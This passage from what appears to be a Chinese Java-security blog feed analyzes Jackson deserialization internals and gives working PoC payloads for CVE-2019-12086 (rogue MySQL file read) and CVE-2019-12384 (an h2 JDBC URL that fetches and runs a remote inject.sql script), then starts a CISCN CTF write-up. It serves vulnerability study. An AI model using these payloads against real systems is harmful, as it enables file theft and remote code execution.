class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jackson反序列化</title>
      <link href="/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="使用Jackson"><a href="#使用Jackson" class="headerlink" title="使用Jackson"></a>使用Jackson</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;default construct&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Constructor&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setNAme&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(person);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(person1);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">//Constructor getName  </span></span><br><span class="line"><span class="comment">//getAge  </span></span><br><span class="line"><span class="comment">//&#123;&quot;name&quot;:&quot;n4c1&quot;,&quot;age&quot;:20&#125;  </span></span><br><span class="line"><span class="comment">//default construct setNAme  </span></span><br><span class="line"><span class="comment">//setAge  </span></span><br><span class="line"><span class="comment">//org.n4c1.unserial.jackson.Person@58651fd0</span></span><br></pre></td></tr></table></figure><p>被反序列化的类必须拥有一个无参构造器</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>大致过一遍jackson反序列化流程</p><p>断点打在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br></pre></td></tr></table></figure><p>这一行, 跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810224836.png" alt="image.png"><br>可以看见给<code>_readMapAndClose</code>传了两个参数, 一个是<code>_jsonFactory.createParser</code>构建的<code>词法解析器</code>, 一个是<code>_typeFactory.constructType</code>构建的<code>type类型</code><br>词法解析器就没什么好看的, 不太可能涉及对象创建的方法调用</p><h3 id="SimpleType的创建"><a href="#SimpleType的创建" class="headerlink" title="SimpleType的创建"></a><code>SimpleType</code>的创建</h3><p>先看一下<code>_typeFactory.constructType</code>方法, 看看传进去的type是什么, 如何而来</p><p>跟进到<code>_fromAny</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225309.png" alt="image.png"><br>首先是对期望类(Person.class)的类型判断, 这里是Class<br>跟进到<code>_fromClass</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225642.png" alt="image.png"><br>首先是<code>_findWellKnownSimple</code>对基本类型的判断<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225714.png" alt="image.png"><br>当然我们这里是自定义的类型, 会返回null</p><p>之后往下, 看起来是从最近构建的对象中查找, 类似缓存机制 由<code>bindings</code>和<code>_typeCache</code>这两个属性存储<br>当然这里是找不到的</p><p>之后实例了一个ClassStack作为context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230324.png" alt="image.png"></p><p>大概还是用于还原对象, 这并不重要</p><p>中间一段是判断数组, 获取父类等, 不重要<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230505.png" alt="image.png"></p><p>关键在于<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231617.png" alt="image.png"><br>这里会调用<code>_newSimpleType</code>来创建一个新的<code>SimpleType</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231731.png" alt="image.png"><br>返回的结果其实就是把我们自定义的<code>Person</code>类包装成类jackson自己的<code>SimpleType</code>来作为反序列化结果的类型<br>之后就是把得到的这个<code>SimpleType</code>放进<code>_typeCache</code>然后返回<br>那么我们还是回到<code>_readMapAndClose</code>看看实质上的反序列化过程</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810232247.png" alt="image.png"><br>可以看见4009行的获取反序列化器, 这个逻辑其实和fastjson很相似, 对不同的类型有不同的反序列化器, 这里获取到的应该是JavaBean反序列化器<br>具体创建过程先掠过, 直接去看反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233007.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233056.png" alt="image.png"><br>跟进</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233121.png" alt="image.png"><br>跟进<code>_valueInstantiator.createUsingDefault</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233209.png" alt="image.png"><br>直接调用到了Person类的构造器, 这个构造器应该就是在创建反序列化器的时候获取到的</p><p>接下来就是反序列化bean的property<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233420.png" alt="image.png"><br>跟进prop.deserializeAndSet<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233539.png" alt="image.png"><br>可以看见对setter进行了调用</p><p>所以对于这个<code>BeanDeserializer</code>有以下关键属性</p><ol><li><code>_valueInstantiator</code>: 记录了类的基本信息, 包括构造器, class信息, 用来实例化bean</li><li><code>_beanProperties</code>: 记录bean property信息, 包括名称, 字段的反序列化器, setter方法</li></ol><p>之后就是把得到的属性set到类实例中, 反序列化就基本上结束了</p><h2 id="CVE-2019-12086-mysql-fileRead"><a href="#CVE-2019-12086-mysql-fileRead" class="headerlink" title="CVE-2019-12086 mysql fileRead"></a>CVE-2019-12086 mysql fileRead</h2><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;com.mysql.cj.jdbc.admin.MiniAdmin\&quot;, \&quot;jdbc:mysql://127.0.0.1:3306/\&quot;]&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>漏洞范围在 2.x - 2.9.9</li><li>被攻击的程序 classpath 中要有 8.0.14 以下的版本的 Mysql 驱动</li><li>可被攻击的类 <code>com.mysql.cj.jdbc.admin.MiniAdmin</code></li></ul><p>这个打的是mysql fakeServer文件读取</p><p><strong>利用工具</strong></p><blockquote><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a><br><a href="https://github.com/BeichenDream/MysqlT/">https://github.com/BeichenDream/MysqlT/</a></p></blockquote><p>依赖<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2019-12384-h2-RCE"><a href="#CVE-2019-12384-h2-RCE" class="headerlink" title="CVE-2019-12384 h2 RCE"></a>CVE-2019-12384 h2 RCE</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0-alpha4<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2rce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        objectMapper.enableDefaultTyping();<span class="comment">//开启 defaultTyping        </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectMapper.readValue(json, Object.class);<span class="comment">//反序列化对象  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(o);<span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DriverManagerConnectionSource.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DriverManagerConnectionSource</span> <span class="keyword">extends</span> <span class="title class_">ConnectionSourceBase</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">driverClass</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (driverClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">                Class.forName(driverClass);  </span><br><span class="line">                discoverConnectionProperties();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                addError(<span class="string">&quot;WARNING: No JDBC driver specified for logback DriverManagerConnectionSource.&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;  </span><br><span class="line">            addError(<span class="string">&quot;Could not load JDBC driver class: &quot;</span> + driverClass, cnfe);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> ch.qos.logback.core.db.ConnectionSource#getConnection()  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (getUser() == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url, getUser(), getPassword());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the url.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getUrl</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Sets the url.     ** <span class="doctag">@param</span> url  </span></span><br><span class="line"><span class="comment">     *          The url to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUrl</span><span class="params">(String url)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.url = url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the name of the driver class.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getDriverClass</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Sets the driver class.     ** <span class="doctag">@param</span> driverClass  </span></span><br><span class="line"><span class="comment">     *          The driver class to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDriverClass</span><span class="params">(String driverClass)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.driverClass = driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际调用点在getConnection, 因此需要序列化</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://b1ue.cn/archives/189.html">## Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java题目大杂烩</title>
      <link href="/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
      <url>/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN-2023-初赛-DeserBug"><a href="#CISCN-2023-初赛-DeserBug" class="headerlink" title="[CISCN 2023 初赛]DeserBug"></a>[CISCN 2023 初赛]DeserBug</h2><p>题目给出的cc依赖版本为3.2.2</p><p>相对于经典的3.2.1, 几个重要的类被禁止反序列化了</p><p>例如<code>InvokerTransformer</code>重写了<code>readObject</code> <code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream os)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   os.defaultWriteObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   is.defaultReadObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上在3.2.2中以下这些类都被禁用了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure><p>那么考虑字节码加载</p><p>看一下题目源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 